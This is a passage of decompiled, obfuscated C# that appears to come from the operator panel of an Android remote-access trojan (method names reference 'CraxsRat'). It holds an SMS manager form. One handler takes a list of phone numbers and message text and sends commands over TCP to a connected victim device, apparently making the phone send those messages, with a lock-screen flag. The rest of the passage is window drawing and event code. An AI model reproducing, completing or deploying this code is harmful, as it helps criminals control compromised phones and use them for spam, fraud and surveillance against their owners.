            break;
          case 2:
            if (Data.\u0024IR135\u002D2 != null)
            {
              num1 = (int) num3 * 1312129125 ^ 1562117904;
              continue;
            }
            // ISSUE: reference to a compiler-generated method
            callBack = Data.\u0024IR135\u002D2 = new WaitCallback(Data.\u0024I._Lambda\u0024__R135\u002D2);
            break;
          case 3:
            goto label_1;
          default:
            goto label_9;
        }
        object[] state = new object[8]
        {
          (object) this.DGV0,
          (object) ((Data) this).tmpFolderUSER,
          (object) EXGuarder.\u00343140D3F,
          (object) ((Data) this).tmpClientName,
          (object) (((Data) this).tmpCountry + EXGuarder.\u0032D6B5A05 + ((Data) this).tmpAddressIP),
          (object) EXGuarder.\u00316434A05,
          (object) EXGuarder.\u00300552022,
          (object) (DateAndTime.Now.ToString(EXGuarder.\u0032903363B) + EXGuarder.\u00377501304)
        };
        ThreadPool.QueueUserWorkItem(callBack, (object) state);
        num1 = -1254776449;
      }
label_3:
      return;
label_9:;
    }

    private void BoxTitle_Paint(object sender, PaintEventArgs e)
    {
      if (!((Data) this).BoxTitlePaintEventArgsWait)
        return;
label_1:
      int num1 = 1544145889;
      Color defaultColorForeground;
      int count;
      string str1;
      Brush brush1;
      Brush brush2;
      Rectangle rect;
      string str2;
      Size size;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -(num1 * 78301823 * -964674739 + ((2029974618 ^ -1704923587) - -1343196702 ^ ~1799357291 * 969014965) - -(159789908 * 235732551) - (-390169860 ^ -106085354))) % 12U)
        {
          case 0:
            goto label_1;
          case 1:
            Color backColor = this.BoxTitle.BackColor;
            int r = (int) backColor.R;
            backColor = this.BoxTitle.BackColor;
            int g = (int) backColor.G;
            backColor = this.BoxTitle.BackColor;
            int b = (int) backColor.B;
            brush2 = (Brush) new SolidBrush(Color.FromArgb(170, r, g, b));
            rect = new Rectangle(0, 2, this.BoxTitle.Width, checked (TextRenderer.MeasureText(str1 + Strings.Space(10) + str2, Settings.f).Height + 5));
            num1 = (int) num2 * -1903448380 ^ -53439158;
            continue;
          case 2:
            this.BoxTitle.Height = checked (size.Height + 3);
            num1 = (int) num2 * -569097577 ^ -1348022058;
            continue;
          case 3:
            e.Graphics.FillRectangle(new Pen(brush2).Brush, rect);
            e.Graphics.DrawString(str1 + Strings.Space(10) + str2 + Strings.Space(10), Settings.f, brush1, 0.0f, 2f);
            num1 = (int) num2 * 1643751333 ^ 1126619492;
            continue;
          case 4:
            str2 = EXGuarder.\u0030914651B + Conversions.ToString(this.DGV0.SelectedRows.Count);
            num1 = (int) num2 * 1787716849 ^ -62803574;
            continue;
          case 5:
            goto label_14;
          case 6:
            brush1 = (Brush) new SolidBrush(getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground);
            num1 = (int) num2 * -1526346766 ^ -1656525636;
            continue;
          case 7:
            e.Graphics.DrawLine(new Pen(Color.FromArgb(50, (int) defaultColorForeground.R, (int) defaultColorForeground.G, (int) defaultColorForeground.B)), 0, 1, this.BoxTitle.Width, 1);
            num1 = (int) num2 * -2088159737 ^ 2271336;
            continue;
          case 8:
            size = TextRenderer.MeasureText(EXGuarder.\u00350106F0D, Settings.f);
            int num3 = this.BoxTitle.Height == checked (size.Height + 3) ? -1063602392 : (num3 = 470328457);
            num1 = num3 ^ (int) num2 * -1819660744;
            continue;
          case 9:
            str1 = EXGuarder.\u003202D734B + Conversions.ToString(count);
            num1 = (int) num2 * -1361774425 ^ 1579936336;
            continue;
          case 10:
            count = this.DGV0.Rows.Count;
            num1 = (int) num2 * -1346960071 ^ -533829614;
            continue;
          case 11:
            defaultColorForeground = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
            num1 = (int) num2 * -154062723 ^ -720730987;
            continue;
          default:
            goto label_15;
        }
      }
label_14:
      return;
label_15:;
    }

    private void AngelAndroidForm_Activated(object sender, EventArgs e)
    {
      this.BoxTitle.Invalidate();
    }

    private void AngelAndroidForm_Deactivate(object sender, EventArgs e)
    {
      this.BoxTitle.Invalidate();
    }

    private void BoxTitle_Resize(object sender, EventArgs e) => this.BoxTitle.Invalidate();

    private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
    {
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwsakartx(object sender, EventArgs e)
    {
      try
      {
        if (((Data) this).classClient == null)
          return;
label_1:
        int num1 = -1762667449;
        while (true)
        {
          int num2 = num1;
          uint num3;
          int index;
          int num4;
          smsMaker smsMaker;
          TcpClient client;
          string text;
          string[] strArray;
          int num5;
          int num6;
          string str;
          object[] ParametersObjects;
          switch ((num3 = (uint) ~(346851376 - -1045087140 - -~~(num2 - (1678912161 * (272973673 * -413587607 - (1365144428 * 491287203 - 1313173425)) ^ ~-(-793055130 ^ 1053304077 * -722299331))))) % 19U)
          {
            case 0:
              num6 = 0;
              int num7 = !smsMaker.checkall.Checked ? -2141375992 : (num7 = 1563795046);
              num1 = num7 ^ (int) num3 * -1897773149;
              continue;
            case 1:
              num1 = (int) num3 * -1055251963 ^ -28304742;
              continue;
            case 2:
              goto label_22;
            case 3:
              smsMaker = (smsMaker) new ShowTipform();
              int num8 = smsMaker.ShowDialog() != DialogResult.OK ? -1244900450 : (num8 = 1984603791);
              num1 = num8 ^ (int) num3 * 1636198274;
              continue;
            case 4:
              int num9 = smsMaker.numslist.Items.Count <= 0 ? -1091783634 : (num9 = 1916954669);
              num1 = num9 ^ (int) num3 * 430545998;
              continue;
            case 5:
              int num10;
              num1 = num10 = index <= num4 ? -1244759775 : (num10 = -1784177734);
              continue;
            case 6:
              // ISSUE: reference to a compiler-generated field
              client = ((Data._Closure\u0024__) ((Data) this).classClient).myClient;
              num1 = (int) num3 * -865788378 ^ 1923598898;
              continue;
            case 7:
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              ParametersObjects = new object[4]
              {
                (object) client,
                (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003286D6017 + str + EXGuarder.\u0031A606C4F + text + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(num5) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(num6) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((Data) this).classClient).ClientRemoteAddress),
                (object) Codes.Encoding().GetBytes(EXGuarder.\u00362370E3F),
                (object) ((Data) this).classClient
              };
              num1 = (int) num3 * -970608122 ^ 202801874;
              continue;
            case 8:
              // ISSUE: reference to a compiler-generated method
              AsyncLock.VB\u0024StateMachine_2_LockAsync.ShowSucess(EXGuarder.\u0030277296F);
              num1 = -1797255466;
              continue;
            case 9:
              checked { ++index; }
              num1 = -1310825753;
              continue;
            case 10:
              str = Conversions.ToString(smsMaker.numslist.Items[index]);
              num1 = -1583680792;
              continue;
            case 11:
              strArray = ((Data) ((Data) this).classClient).Keys.Split(':');
              num5 = 0;
              num1 = (int) num3 * -1813942835 ^ 638350928;
              continue;
            case 12:
              num4 = checked (smsMaker.numslist.Items.Count - 1);
              num1 = 1831631269;
              continue;
            case 13:
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              ((Data) this).classClient.SendMessage(new object[4]
              {
                (object) client,
                (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0034A5C610C + text + EXGuarder.\u0031A606C4F + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(num5) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(num6) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((Data) this).classClient).ClientRemoteAddress),
                (object) Codes.Encoding().GetBytes(EXGuarder.\u00362370E3F),
                (object) ((Data) this).classClient
              });
              num1 = (int) num3 * -185590279 ^ -2045619310;
              continue;
            case 14:
              index = 0;
              num1 = (int) num3 * -1257676073 ^ 982644269;
              continue;
            case 15:
              int num11 = string.IsNullOrEmpty(str) | string.IsNullOrWhiteSpace(str) ? 1246132860 : (num11 = -1141332130);
              num1 = num11 ^ (int) num3 * 596055202;
              continue;
            case 16:
              text = smsMaker.msgtext.Text;
              num1 = (int) num3 * 1093967925 ^ -1065319414;
              continue;
            case 17:
              ((Data) this).classClient.SendMessage(ParametersObjects);
              num1 = (int) num3 * -1733371266 ^ 1391941360;
              continue;
            case 18:
              goto label_1;
            default:
              goto label_23;
          }
        }
label_22:
        return;
label_23:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void DGV0_RowsRemoved(object sender, DataGridViewRowsRemovedEventArgs e)
    {
      this.BoxTitle.Invalidate();
    }

    private void DGV0_RowsAdded(object sender, DataGridViewRowsAddedEventArgs e)
    {
      this.BoxTitle.Invalidate();
    }

    private void DGV0_SelectionChanged(object sender, EventArgs e) => this.BoxTitle.Invalidate();

    static SMSManager() => Data.\u0024I = (SMSManager._Closure\u0024__) new SMSManager();
  }
}
